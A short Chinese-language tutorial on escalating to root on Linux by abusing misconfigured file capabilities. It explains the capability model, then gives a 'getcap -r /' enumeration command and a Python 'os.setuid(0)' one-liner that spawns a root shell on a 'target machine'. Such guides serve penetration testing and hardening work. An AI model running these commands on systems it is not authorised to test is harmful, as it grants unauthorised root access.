# 利用capabilities提权的方法

## Capabilities漏洞利用机制：
原理很简单，就是将之前与超级用户root（UID=0）关联的特权细分为不同的功能组，Capabilites作为线程（Linux并不真正区分进程和线程）的属性存在，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有

相似功能的内核调用被分到同一组中。

这样一来，权限检查的过程就变成了：在执行特权操作时，如果线程的有效身份不是root，就去检查其是否具有该特权操作所对应的capabilities，并以此为依据，决定是否可以执行特权操作。

如果Capabilities设置不正确，就会让攻击者有机可乘，实现权限提升。

## 利用思路：

收集带有capabilities属性的程序，而该程序带有capabilities就等于执行时带有特权，便可以用该程序进行uid的切换，切换为0即为root

## 操作
### 1.在目标机上以普通用户登录后运行
```
getcap -r /
或
getcap -r / 2>/dev/null
```
查看带有cat_setuid的capability的程序。

例子：
```
/usr/bin/python = cap_setuid_ep
```

### 2.根据该程序的名称到GTFOBins上进行查找，选择capabilities那一行
例子：

![3082583-20230323110811090-1289384431](https://github.com/user-attachments/assets/3e372a33-c9ac-4b0c-9813-38d6db09eb75)

### 3.在目标机上运行
```
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```
即可为root
